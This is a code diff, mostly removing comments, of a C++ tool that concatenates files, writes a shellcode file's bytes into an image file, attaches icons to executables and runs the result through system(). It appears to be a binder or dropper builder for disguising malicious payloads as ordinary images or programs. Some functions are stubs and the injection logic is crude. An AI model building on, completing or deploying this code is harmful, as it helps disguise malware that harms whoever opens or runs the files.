@@ -62,18 +62,15 @@ void concatenateFiles(const std::string& outputFile, const std::vector<std::stri
     std::cout << "Successfully concatenated files into " << outputFile << std::endl;
 }
 
-bool isExecutable(const std::string& filename) {
-    // Logic to check if it's an executable
+bool isExecutable(const std::string& filename) {    
     return true; 
 }
 
 bool isImage(const std::string& filename) {
-    // Logic to check if it's an image
     return true; 
 }
 
 bool isIcon(const std::string& filename) {
-    // Check if the file has a .ico extension
     return filename.size() > 4 && filename.substr(filename.size() - 4) == ".ico";
 }
 
@@ -90,44 +87,38 @@ void injectShellcode(const std::string& imageFile, const std::string& shellcodeF
         return;
     }
 
-    // Get the size of the shellcode and image file
     std::streamsize shellcodeSize = shellcodeInput.tellg();
     std::streamsize imageSize = imageInput.tellg();
     imageInput.seekg(0, std::ios::beg);
     shellcodeInput.seekg(0, std::ios::beg);
 
-    // Check if the shellcode size is larger than the image size
     if (shellcodeSize > imageSize) {
         std::cerr << "Shellcode size exceeds image size. Cannot inject shellcode." << std::endl;
         return;
     }
 
-    // Find a suitable location for shellcode injection (e.g., at the end of the image)
+
     std::streampos injectionPoint = imageSize - shellcodeSize;
 
-    // Create a buffer to store the image file content
     std::vector<char> imageBuffer(imageSize);
 
-    // Read the image file content into the buffer
     if (!imageInput.read(imageBuffer.data(), imageSize)) {
         std::cerr << "Error reading image file." << std::endl;
         return;
     }
 
-    // Create a copy of the original image for later restoration
+
     std::vector<char> originalImageBuffer = imageBuffer;
 
-    // Read the shellcode content into a buffer
+
     std::vector<char> shellcodeBuffer(shellcodeSize);
     if (!shellcodeInput.read(shellcodeBuffer.data(), shellcodeSize)) {
         std::cerr << "Error reading shellcode." << std::endl;
         return;
     }
 
-    // Inject the shellcode into the image buffer
     std::copy(shellcodeBuffer.begin(), shellcodeBuffer.end(), imageBuffer.begin() + injectionPoint);
 
-    // Write the modified buffer back to the image file
     std::ofstream imageOutput(imageFile, std::ios::binary);
     if (!imageOutput.write(imageBuffer.data(), imageSize)) {
         std::cerr << "Error writing image file." << std::endl;
@@ -137,7 +128,7 @@ void injectShellcode(const std::string& imageFile, const std::string& shellcodeF
     std::cout << "Shellcode successfully injected into the image." << std::endl;
 
     if (restoreImage) {
-        // Restore the original image
+    
         imageOutput.seekp(0);
         if (!imageOutput.write(originalImageBuffer.data(), imageSize)) {
             std::cerr << "Error restoring the original image." << std::endl;
@@ -150,19 +141,19 @@ void injectShellcode(const std::string& imageFile, const std::string& shellcodeF
 
 #ifdef _WIN32
 void addIconToExecutable(const std::string& executable, const std::string& icon) {
-    // Implementation for adding icon on Windows
+    
 }
 #endif
 
 #ifdef __linux__
 void addIconToExecutable(const std::string& executable, const std::string& icon) {
-    // Implementation for adding icon on Linux
+
 }
 #endif
 
 #ifdef __APPLE__
 void addIconToExecutable(const std::string& executable, const std::string& icon) {
-    // Implementation for adding icon on macOS
+
 }
 #endif
 
@@ -170,9 +161,9 @@ void executeFile(const std::string& filename) {
     std::string command;
 
 #ifdef _WIN32
-    command = filename; // No need for "./" prefix on Windows
+    command = filename; 
 #else
-    command = "./" + filename; // Unix-based systems
+    command = "./" + filename; 
 #endif
 
     int result = system(command.c_str());
@@ -272,11 +263,11 @@ int main(int argc, char* argv[]) {
     concatenateFiles(outputFile, filesToConcatenate);
 
     if (injectShellcodeFlag) {
-        // Inject the shellcode into the image
+    
         injectShellcode(outputFile, shellcodeFile, restoreImage);
     }
 
-    // Add icon to the executable
+    
     if (!iconFile.empty()) {
         if (isIcon(iconFile)) {
             addIconToExecutable(outputFile, iconFile);
